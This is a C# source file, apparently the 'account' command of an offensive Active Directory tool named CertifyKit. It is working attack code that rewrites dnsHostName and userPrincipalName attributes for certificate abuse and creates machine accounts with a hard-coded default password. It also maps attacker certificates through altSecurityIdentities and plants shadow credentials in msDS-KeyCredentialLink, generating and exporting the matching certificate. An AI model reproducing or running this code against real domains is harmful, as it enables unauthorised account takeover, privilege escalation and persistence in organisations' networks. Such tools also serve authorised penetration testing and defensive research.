using CERTENROLLLib;
using System;
using System.Collections.Generic;
using CertifyKit.Lib;
using System.DirectoryServices;


using System.Security.Cryptography.X509Certificates;

using DSInternals.Common.Data;


namespace CertifyKit.Commands
{
    public class Account : ICommand
    {
        public static string CommandName => "account";
        
        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Action: Account Operation");

            LdapOperations ldapOperations = new LdapOperations();
            string domain = arguments.ContainsKey("/domain") ? arguments["/domain"] : ldapOperations.GetDomain();
            string domainController = arguments.ContainsKey("/ldapserver") ? arguments["/ldapserver"] : ldapOperations.GetDC();

            string account;
            var machine = arguments.ContainsKey("/machine");
            var user = arguments.ContainsKey("/user");
            if (machine)
            {
                account = arguments["/machine"];
                if (!account.EndsWith("$"))
                    account += "$";
            }
            else if (user)
            {
                account = arguments["/user"];
            }
            else
            {
                Console.WriteLine("\n[X] /user or /machine parameter missing");
                return;
            }

            if (arguments.ContainsKey("/attribute"))
            {
                var append = arguments.ContainsKey("/append");
                var clear = arguments.ContainsKey("/clear");
                var remove = arguments.ContainsKey("/remove");
                var query = arguments.ContainsKey("/query");

                string attribute = arguments["/attribute"];
                if (clear)
                    AccountUtil.SetAccountAttribute(domain, domainController, attribute, account, null, "clear");
                else if(remove)
                    AccountUtil.SetAccountAttribute(domain, domainController, attribute, account, null, "remove", Int32.Parse(arguments["/remove"]));
                else if (query)
                {
                    Console.WriteLine($"\n[*] Account {account} attribute:");
                    AccountUtil.PrintAttribute(domain, domainController, attribute, account);
                }
                else if (arguments.ContainsKey("/value"))
                {
                    string value = arguments["/value"];
                    if(append)
                        AccountUtil.SetAccountAttribute(domain, domainController, attribute, account, arguments["/value"], "append");
                    AccountUtil.SetAccountAttribute(domain, domainController, attribute, account, arguments["/value"]);
                }
                else
                {
                    Console.WriteLine($"\n[X] Parameters missing to alter atribute {attribute}");
                    return;
                }

            }
            // user account cannot contain DNS attribute
            else if (machine && arguments.ContainsKey("/dns"))
            {
                string newDns = arguments["/dns"];
                AccountUtil.SetAccountAttribute(domain, domainController, "dnshostname", account, newDns);

            }
            // machine account can contain UPN attribute
            else if (arguments.ContainsKey("/upn"))
            {
                if (arguments.ContainsKey("/clear"))
                    AccountUtil.SetAccountAttribute(domain, domainController, "userPrincipalName", account, null, "clear");
                else
                    AccountUtil.SetAccountAttribute(domain, domainController, "userPrincipalName", account, arguments["/upn"]);
            }
            else if (machine && arguments.ContainsKey("/createpc"))
            {
                string machinePassword = "P@ssw0rdHagrid29";
                if (arguments.ContainsKey("/password"))
                    machinePassword = arguments["/password"];
                AccountUtil.NewMachineAccount(domain, domainController, account, machinePassword);
                Console.WriteLine("\n[*] Machine account node {0} added with password {1}", account, machinePassword);

            }
            else if (machine && arguments.ContainsKey("/removepc"))
            {
                //require GenericWrite priv
                AccountUtil.RemoveMachineAccount(domain, domainController, account);
                Console.WriteLine("\n[*] Machine account node {0} removed", account);

            }
            else if (machine && arguments.ContainsKey("/enable"))
            {
                AccountUtil.SetAccountAttribute(domain, domainController, "AccountDisabled", account, "false");
                
            }
            else if (machine && arguments.ContainsKey("/disable"))
            {
                AccountUtil.SetAccountAttribute(domain, domainController, "AccountDisabled", account, "true");

            }
            else if (arguments.ContainsKey("/altsecid"))
            {
                //can be a file/thumbprint/base64 cert
                if (arguments.ContainsKey("/certificate"))
                {
                    string password = arguments.ContainsKey("/password") ? arguments["/password"] : "";
                    string altsecid = ListUtil.GenCertAltSecId(arguments["/certificate"], password);
                    AccountUtil.SetAccountAttribute(domain, domainController, "altSecurityIdentities", account, altsecid, "append");
                }
                else if (arguments.ContainsKey("/list"))
                {
                    Console.WriteLine($"\n[*] Account {account} attribute:");
                    AccountUtil.PrintAttribute(domain, domainController, "altSecurityIdentities", account);
                }
                else if (arguments.ContainsKey("/remove"))
                    AccountUtil.SetAccountAttribute(domain, domainController, "altSecurityIdentities", account, null, "remove", Int32.Parse(arguments["/remove"]));
                else if (arguments.ContainsKey("/clear"))
                    AccountUtil.SetAccountAttribute(domain, domainController, "altSecurityIdentities", account, null, "clear");
                else
                    Console.WriteLine($"\n[X] /certificate parameter missing. Pick a certificate to map account {account} for the purpose of authentication");

            }
            else if (arguments.ContainsKey("/shadow"))
            {
                if (arguments.ContainsKey("/list"))
                {
                    Console.WriteLine($"\n[*] Account {account} attribute:");
                    AccountUtil.PrintAttribute(domain, domainController, "msDS-KeyCredentialLink", account);
                }
                else if (arguments.ContainsKey("/remove"))
                    AccountUtil.SetAccountAttribute(domain, domainController, "msDS-KeyCredentialLink", account, null, "remove", Int32.Parse(arguments["/remove"]));
                else if (arguments.ContainsKey("/clear"))
                    AccountUtil.SetAccountAttribute(domain, domainController, "msDS-KeyCredentialLink", account, null, "clear");
                else
                {
                    X509Certificate2 cert = ShadowCredUtil.GenerateSelfSignedCert(account);
                    Console.WriteLine("\n[*] Self signed certificate generated");
                    KeyCredential keyCredential = ShadowCredUtil.GenerateKeyCredential(cert, account, domain, domainController);
                    Console.WriteLine("[*] KeyCredential generated");
                    AccountUtil.SetAccountAttribute(domain, domainController, "msDS-KeyCredentialLink", account, keyCredential.ToDNWithBinary(), "append");
                    string encpass = arguments.ContainsKey("/encpass") ? arguments["/encpass"] : "";

                    if (arguments.ContainsKey("/outfile"))
                    {
                        string outfile = arguments["/outfile"];
                        ListUtil.ExportCert(cert, outfile, encpass);
                        Console.WriteLine($"\n[*] Exported Certificate   : {outfile}");
                    }
                    else if (arguments.ContainsKey("/install"))
                    {
                        ListUtil.InstallCert(cert);
                        Console.WriteLine("\n[*] Certificate installed!");
                    }
                    else
                    {
                        string base64Cert = ListUtil.Base64Cert(cert, encpass);
                        Console.WriteLine($"\n[*] Base64 encoded certificate:\n\r{base64Cert}");
                    }
                }
            }
            else
            {
                Console.WriteLine($"\n[*] Account {account} attribute:");
               if (machine)
                    AccountUtil.PrintAttribute(domain, domainController, "dnshostname", account);
                AccountUtil.PrintAttribute(domain, domainController, "userPrincipalName", account);
                AccountUtil.PrintAttribute(domain, domainController, "altSecurityIdentities", account);
                AccountUtil.PrintAttribute(domain, domainController, "msDS-KeyCredentialLink", account);
            }

        }
    }
}